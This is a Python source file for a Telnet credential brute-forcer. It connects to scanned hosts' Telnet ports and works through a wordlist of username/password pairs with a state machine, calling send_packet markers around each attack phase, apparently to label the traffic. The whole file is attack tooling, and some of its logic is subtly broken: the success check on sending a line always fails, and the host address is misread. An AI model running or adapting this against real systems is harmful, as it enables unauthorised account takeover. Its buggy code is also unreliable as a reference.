from src.scanner import Scanner
from src.scanner import Host
import os
from telnetlib import Telnet
from enum import Enum
from packet import send_packet


class States(Enum):
    WAITING = 0
    LOGIN = 1
    LOGIN_SENT = 2
    PASSWORD_SENT = 3
    FAILED = 4
    LOGGED_IN = 5


class Connection:
    def __init__(self, host, port, fd):
        self.state = States.WAITING
        self.host = host
        self.port = port
        self.fd = fd
        self.counter = 0


class Telnet_Bruteforce:
    def __init__(self, wordlist_dir: str, hosts: list[Host]):
        if not os.access(wordlist_dir, os.R_OK):
            print("Error: Wordlist not found")
            exit(1)
        self.wordlist = wordlist_dir
        self.cons = [self.init_host(host, port)
                     for host in hosts
                     for port in host.filtered_ports["telnet"]]
        self.cons = [x for x in self.cons if x is not None]


    def init_host(self, host, port):
        try:
            send_packet("telnet_bruteforce_init_connection", host.ip, "start", host.mac)
            con = Connection(host.ip, port, Telnet(host.ip, port))
            send_packet("telnet_bruteforce_init_connection", host.ip, "end", host.mac)
        except ConnectionRefusedError:
            con = None
        return con

    def send_line(self, fd, msg: str):
        try:
            fd.write(f"{msg}\n".encode())
        except BaseException:
            return False

    def evaluate_username(self, fd):
        try:
            f = fd.read_until(":".encode(), timeout=5)
        except ConnectionResetError:
            return None
        res = f.strip().decode()
        if res == "Password:":
            return True
        if res.split("\n")[1] == "login:":
            return False

    def evaluate_password(self, fd):
        try:
            f = fd.read_until(":".encode(), timeout=5)
        except ConnectionResetError:
            return None
        res = f.strip().decode()
        if res == "Last login:":
            return True
        if res.split("\n")[1] == "login:":
            return False


    def retrieve_user_pass(self, idx):
        with open(self.wordlist, "r") as fd:
            wordlist = fd.readlines()
            if idx < len(wordlist):
                return wordlist[idx].split()[0], wordlist[idx].split()[1]
            else:
                return "", ""

    def consume_login(self, fd):
        try:
            fd.read_until(":".encode(), timeout=5)
        except BrokenPipeError:
            return False
        return True

    def attack(self):
        flag = True
        while flag:
            flag = False
            for con in self.cons:
                if con.state == States.FAILED or con.state == States.LOGGED_IN:
                    continue
                elif con.state == States.WAITING:
                    flag = True
                    if self.consume_login(con.fd):
                        con.state = States.LOGIN
                    else:
                        con.state = States.FAILED
                elif con.state == States.LOGIN:
                    flag = True
                    user, _ = self.retrieve_user_pass(con.counter)
                    send_packet("telnet_bruteforce_send_username", con.host.ip, "start", con.host.mac)
                    if self.send_line(con.fd, user):
                        con.state = States.LOGIN_SENT
                    else:
                        con.state = States.FAILED
                    send_packet("telnet_bruteforce_send_username", con.host.ip, "stop", con.host.mac)
                elif con.state == States.LOGIN_SENT:
                    flag = True
                    res = self.evaluate_username(con.fd)
                    if res is None:
                        con.state = States.FAILED
                    elif not res:
                        con.state = States.LOGIN
                        con.counter += 1
                    else:
                        send_packet("telnet_bruteforce_send_password", con.host.ip, "start", con.host.mac)
                        _, passw = self.retrieve_user_pass(con.counter)
                        if self.send_line(con.fd, passw):
                            con.state = States.LOGIN_SENT
                        else:
                            con.state = States.FAILED
                        con.state = States.PASSWORD_SENT
                        send_packet("telnet_bruteforce_send_password", con.host.ip, "stop", con.host.mac)
                elif con.state == States.PASSWORD_SENT:
                    flag = True
                    res = self.evaluate_password(con.fd)
                    if res is None:
                        con.state = States.FAILED
                    elif not res:
                        con.state = States.LOGIN
                        con.counter += 1
                    else:
                        con.state = States.LOGGED_IN
                        # Später kann man dann über Counter und State ablesen welche Login Credentials für welchen Host sind.












